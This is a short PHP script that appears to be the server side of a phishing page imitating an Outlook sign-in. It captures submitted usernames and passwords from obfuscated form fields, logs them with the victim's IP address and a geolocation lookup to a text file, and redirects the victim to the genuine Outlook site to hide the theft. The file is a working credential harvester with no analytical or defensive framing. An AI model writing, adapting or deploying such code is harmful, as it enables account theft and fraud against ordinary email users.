<?php
ini_set("display_errors", 0);
function getIP() {
   if (isset($_SERVER)) {
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         return $_SERVER['HTTP_X_FORWARDED_FOR'];
      } else {
         return $_SERVER['REMOTE_ADDR'];
      }
   } else {
      if (isset($GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDER_FOR'])) {
         return $GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDED_FOR'];
      } else {
         return $GLOBALS['HTTP_SERVER_VARS']['REMOTE_ADDR'];
      }
   }
}

$myip = getIP() ;
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$myip));
@$pais = $meta['geoplugin_countryName']; 
@$region = $meta['geoplugin_regionName'];


$file = fopen("picho100.txt", "a");
fwrite($file, "|| Usuario : ".$_POST['tlVVJNECrWGtadX']." - Clave: ".$_POST['mxLRLDLOWkkKsDR']." - IP: ".$myip." ".$pais." ".$region." ".date('l jS \of F Y h:i:s A') .PHP_EOL);
fwrite($file, "||====================" . PHP_EOL);
fclose($file);


header('location: https://outlook.live.com');

?>